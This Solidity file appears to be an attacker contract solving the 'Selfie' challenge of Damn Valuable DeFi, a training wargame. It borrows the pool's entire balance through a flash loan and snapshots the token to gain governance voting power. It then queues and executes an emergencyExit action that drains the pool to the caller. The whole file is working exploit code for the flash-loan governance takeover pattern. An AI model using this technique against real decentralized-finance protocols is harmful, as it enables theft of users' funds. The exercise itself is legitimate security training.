// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "./SelfiePool.sol";
import "hardhat/console.sol";

contract SelfieHack {
    DamnValuableTokenSnapshot public token;
    SelfiePool public pool;
    SimpleGovernance public gov;
    uint public actionId;

    constructor(address _token, address _pool, address _gov) {
        token = DamnValuableTokenSnapshot(_token);
        pool = SelfiePool(_pool);
        gov = SimpleGovernance(_gov);
    }

    function attack() external {
        uint poolBal = token.balanceOf(address(pool));
        IERC3156FlashBorrower receiver = IERC3156FlashBorrower(address(this));
        // bytes memory data = abi.encodeWithSignature(
        //     "approve(address,uint256)",
        //     address(this),
        //     bal
        // );
        pool.flashLoan(receiver, address(token), poolBal, "");
        actionId = gov.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature(
                "emergencyExit(address)",
                address(msg.sender)
            )
        );
    }

    function onFlashLoan(
        address /*initiator*/,
        address /*token*/,
        uint256 /*amount*/,
        uint256 /*fee*/,
        bytes calldata
    ) external returns (bytes32) {
        uint myBal = token.balanceOf(address(this));
        console.log(myBal);
        // We took a snapshot of our balance of the token
        // which we get from the flash loan using the entire balance of the pool
        token.snapshot();
        token.approve(address(msg.sender), myBal);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function attack2() external {
        gov.executeAction(actionId);
    }
}
